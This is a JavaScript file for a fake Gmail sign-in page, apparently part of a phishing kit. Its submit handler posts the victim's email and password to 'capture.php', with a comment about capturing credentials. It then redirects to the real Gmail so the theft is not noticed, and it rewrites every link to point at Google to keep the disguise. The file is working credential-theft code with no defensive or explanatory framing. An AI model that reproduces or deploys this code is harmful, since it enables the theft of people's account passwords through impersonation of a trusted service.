// Gmail sign-in page script
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const showPasswordCheckbox = document.getElementById('show-password');
    
    // Handle floating labels
    const inputs = document.querySelectorAll('input[type="text"], input[type="password"]');
    inputs.forEach(input => {
        // Set placeholder to empty string to make the floating label work
        input.setAttribute('placeholder', ' ');
        
        // Check if input has value on load
        if (input.value.trim() !== '') {
            input.classList.add('has-value');
        }
        
        // Add event listeners for focus and blur
        input.addEventListener('focus', function() {
            this.parentElement.classList.add('focused');
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.classList.remove('focused');
            if (this.value.trim() !== '') {
                this.classList.add('has-value');
            } else {
                this.classList.remove('has-value');
            }
        });
    });
    
    // Show/hide password functionality
    showPasswordCheckbox.addEventListener('change', function() {
        if (this.checked) {
            passwordInput.type = 'text';
        } else {
            passwordInput.type = 'password';
        }
    });
    
    // Form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data
        const username = emailInput.value;
        const password = passwordInput.value;
        
        // Send data to server
        fetch('capture.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => {
            // Redirect to real Gmail after capturing credentials
            window.location.href = 'https://mail.google.com/';
        })
        .catch(error => {
            console.error('Error:', error);
            // Still redirect to real Gmail even if there's an error
            window.location.href = 'https://mail.google.com/';
        });
    });
    
    // Make all links redirect to Google
    const allLinks = document.querySelectorAll('a');
    allLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'https://accounts.google.com/';
        });
    });
});
